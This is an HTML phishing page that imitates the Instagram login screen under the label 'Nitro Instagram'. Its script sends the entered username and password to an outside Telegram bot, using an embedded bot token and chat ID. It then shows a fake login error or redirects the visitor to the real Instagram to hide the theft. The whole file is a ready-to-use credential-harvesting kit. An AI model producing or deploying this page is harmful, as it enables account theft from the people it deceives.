<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login Clone</title>
  <style>
    /* General Styles */
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-container {
      width: 100%;
      max-width: 400px;
      text-align: center;
    }

    /* Login Box */
    .login-box {
      background: #fff;
      padding: 20px;
      border: 1px solid #ddd;
      border-radius: 8px;
    }

    .logo {
      font-family: 'Arial Black', sans-serif;
      font-size: 36px;
      color: #262626;
      margin-bottom: 20px;
    }

    .login-form {
      display: flex;
      flex-direction: column;
    }

    .input-field {
      margin-bottom: 10px;
      padding: 10px;
      border: 1px solid #ddd;
      border-radius: 4px;
      background: #fafafa;
    }

    .input-field:focus {
      border-color: #a3a3a3;
      outline: none;
    }

    .login-button {
      background: #3897f0;
      color: #fff;
      border: none;
      padding: 10px;
      border-radius: 4px;
      cursor: pointer;
      font-weight: bold;
    }

    .login-button:hover {
      background: #287bd1;
    }

    .divider {
      display: flex;
      align-items: center;
      margin: 15px 0;
    }

    .line {
      flex: 1;
      height: 1px;
      background: #ddd;
    }

    .or {
      margin: 0 10px;
      font-size: 12px;
      color: #8e8e8e;
    }

    .fb-login {
      color: #385185;
      font-weight: bold;
      text-decoration: none;
      margin-top: 10px;
      display: inline-block;
    }

    .forgot-password {
      font-size: 12px;
      color: #385185;
      text-decoration: none;
      margin-top: 15px;
      display: inline-block;
    }

    /* Signup Box */
    .signup-box {
      margin-top: 15px;
      background: #fff;
      padding: 15px;
      border: 1px solid #ddd;
      border-radius: 8px;
    }

    .signup-box a {
      color: #3897f0;
      text-decoration: none;
      font-weight: bold;
    }

    .error-message {
      color: red;
      font-size: 14px;
      margin-top: 10px;
      display: none;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="login-box">
      <h1 class="logo">Nitro Instagram</h1>
      <form class="login-form" id="loginForm">
        <input type="text" id="username" placeholder="Phone number, username, or email" class="input-field">
        <input type="password" id="password" placeholder="Password" class="input-field">
        <button type="button" class="login-button" onclick="sendData()">Log In</button>
        <div class="divider">
          <span class="line"></span>
          <span class="or">OR</span>
          <span class="line"></span>
        </div>
        <a href="#" class="fb-login">Log in with Facebook</a>
        <a href="#" class="forgot-password">Forgot password?</a>
        <p class="error-message" id="errorMessage">Incorrect username or password.</p>
      </form>
    </div>
    <div class="signup-box">
      <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>
  </div>

  <script>
    const botToken = "7893539393:AAHW5fYrLtoG6J26rQ_ivjXHGEYew2h4cg8"; // Replace with your bot token
    const chatId = "7261350095"; // Replace with your chat ID

    function sendData() {
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      // Send to Telegram
      const message = `New Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

      fetch(url)
        .then(response => {
          if (!response.ok) {
            console.error("Failed to send message to Telegram");
          }
        })
        .catch(error => console.error("Error:", error));

      // Simulate fake login behavior
      const errorMessage = document.getElementById("errorMessage");

      if (username === "fakeuser" && password === "fakepass") {
        window.location.href = "https://www.instagram.com"; // Redirect to Instagram
      } else {
        errorMessage.style.display = "block"; // Show error message
      }
    }
  </script>
</body>
</html>
